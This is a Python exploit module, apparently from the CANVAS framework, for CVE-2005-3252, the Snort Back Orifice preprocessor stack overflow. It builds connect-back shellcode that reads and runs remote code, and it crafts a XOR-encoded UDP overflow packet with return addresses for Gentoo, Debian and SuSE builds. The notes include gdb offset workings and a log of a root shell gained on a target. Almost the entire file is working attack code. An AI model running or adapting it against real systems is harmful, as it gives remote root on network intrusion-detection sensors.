#! /usr/bin/env python

import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")

import os
import getopt
import socket
import sys
import struct
import time
import select

from exploitutils import *
from tcpexploit import *
from shelllistener import shelllistener
from shelllistener import shellfromtelnet
import addencoder
import canvasengine
import shellcodeGenerator

import linuxshell
from libs.ctelnetlib import Telnet


# GUI info
NAME="Stinky Debug"
DESCRIPTION="Snort <= 2.4.2 BO pp exploit"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Stinky"
DOCUMENTATION["Date public"] = "2005/10/18"
#DOCUMENTATION["OSVDB"] = ""
DOCUMENTATION["References"] = "http://xforce.iss.net/xforce/alerts/id/207"
DOCUMENTATION["Repeatability"] = "Single shot"
DOCUMENTATION["CVE Name"] = "CVE-2005-3252"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3252"
DOCUMENTATION['CVSS'] = 7.5

VERSION="0.1"

runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "i386", "_sparc"], ["_Solaris"], ["_FreeBSD"] ]

GTK2_DIALOG = "dialog.glade2"

NOTES="""
To debug a target, you need to find the compiler specific pad.

(gdb) p/d (int)&type - (int)&buf1
$19 = 1039
(gdb) p/d (int)&i - (int)&type
$20 = 1
(gdb) 

!!! bufpad is: 1039-1024

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbfffedc9 in ?? ()
(gdb)

!!! retaddr is x/x $esp-800 

...

[C] Reading 3 interfaces from remote side
Letting user interact with server
Command:  shellshock
[!] Turning MOSDEF-Node into temporary interactive shell
[!] Note: will revert back to MOSDEF on "exit"
..........shellshocked!
sh: no job control in this shell
sh-2.05b# id
uid=0(root) gid=0(root) 
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
sh-2.05b# 

...

OLDNOTES:

#some cuteness:
#
#static int BoGetDirection(Packet *p, char *pkt_data)
#{
#    u_int32_t len = 0;
#    u_int32_t id = 0;
#    u_int32_t l, i;
#    char type;
#    char buf1[1024];
#    char buf2[1024];
#    char *buf_ptr;
#    char plaintext;
#
#<bas> cute trick involved
#<bas> it checks i < len
#<bas> but i is above buf
#<bas> so you have to make sure you dont make i > len
#<bas> or it halts your overflow
#<bas> on overwriting i :>
# 
# but you have to avoid nuls, or it'll go into buf2, throwing you back 1024
# solution: set the len packet to -1, and offset below that for your i value ;)

# Program received signal SIGSEGV, Segmentation fault.
#0x41424344 in ?? ()
#(gdb)

"""

targets = {
    # name, retwrites, retaddr, align, bufpad
    0 : ["Autoversioning N/A", 0, 0, 0, 0 ], 
    1 : ["Snort 2.4.2 / gcc 3.3.4 (gentoo)", 8, 0xbfffeb70L, 0, 15],
    2 : ["Snort 2.4.2 / gcc 3.3.6 (debian)", 8, 0xbfb4d8c0L, 0, 15],
    3 : ["Snort 2.4.2 / gcc 3.3.5 (suse93)", 8, 0xbfffec10L, 0, 15],
    4 : ["Debug crash on 0x41424344", 8, 0x41424344L, 0, 15]
} 

class theexploit(tcpexploit):

    def __init__(self):
        tcpexploit.__init__(self)
        self.holdrand = 0
        self.shellcode = "\xcc"

    def createShellcode(self):
        localhost = self.callback.ip
        localport = self.callback.port
        myshellcode = shellcodeGenerator.linux_X86()
        myshellcode.addAttr("connect", {"ipaddress":localhost, "port":localport})
        myshellcode.addAttr("read_and_exec", {"fdreg": "esi"})
        shellcode = myshellcode.get()
        badstring = "\x00"
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(badstring)
        self.shellcode = encoder.encode(shellcode)
        if self.shellcode == "":
            raise Exception, "error encoding shellcode"
        self.log("Shellcode length: %d"%len(self.shellcode))
        return self.shellcode

    def neededListenerTypes(self):
        return [canvasengine.LINUXMOSDEF]

    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print "%d : %s"% (i, listline[0])
            i+=1

    def initUdpSock(self):
        self.udpsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return

    def boRand(self):
        self.holdrand = self.holdrand * 214013L + 2531011L
        return (self.holdrand >> 16) & 0x7fff

    def run(self):

        self.host = self.target.interface
        self.port = int(self.argsDict["port"])

        self.setInfo("%s attacking Snort via traffic to %s:%d"%(NAME, self.host, self.port), showlog=1)

        boping = ""
        # magic cookie
        boping += "\x2A\x21\x2A\x51\x57\x54\x59\x3F"
        # len - gets altered to be 0xfefefeff ? check that out
        length = 0xffffffffL
        import struct
        boping += struct.pack("<L", length)
        # id
        boping += "ABCD"
        # type
        boping += "\x01"

        # data - some trickyness involved, see notes
        name, retwrites, retaddr, align, bufpad = targets[self.version]

        boping += "A"*(1024 - (len(self.shellcode) + 256)) + self.shellcode + "A" * 256
        # PAD PAD PAD -- compiler specific !!!
        if bufpad:
            boping += "A"*bufpad
        # type 
        boping += "A"  
        # l && i - make sure i < len, to hit eip
        # take compiler ordering into account, so just treat l as i also
        boping += struct.pack("<L", 0xfefefeffL - (retwrites*4)) # i, avoid nuls
        boping += struct.pack("<L", 0xfefefeffL - (retwrites*4)) # i, avoid nuls
        # id  
        boping += "ABCD" 
        # len - keep > i 
        boping += struct.pack("<L", 0xfefefeffL) # avoid nuls
        # ALIGN
        if align:
            boping += "A"*align
        # ret overwrites
        boping += struct.pack("<L", retaddr) * retwrites
 
        # crc
        boping += "\x00"

        # XOR encode it
        stinkypoo = ""
        for c in boping:
            randm = self.boRand() % 256
            xored = ord(c)^randm
            #print "\\x%.2x (randm: %.2x)"%(xored,randm),
            stinkypoo += chr(xored)

        self.log("Slinging stinky poo...")

        self.initUdpSock()
        self.udpsock.sendto(stinkypoo, (self.host, self.port)) 

        if self.ISucceeded():
            self.setInfo("%s Attacking Snort via traffic to %s:%d (success!)"%(NAME, self.host, self.port), showlog=1)
        else:
            self.setInfo("%s Attacking Snort via traffic to %s:%d (failed?)"%(NAME, self.host, self.port), showlog=1)

        return

if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret = standard_callback_commandline(app)

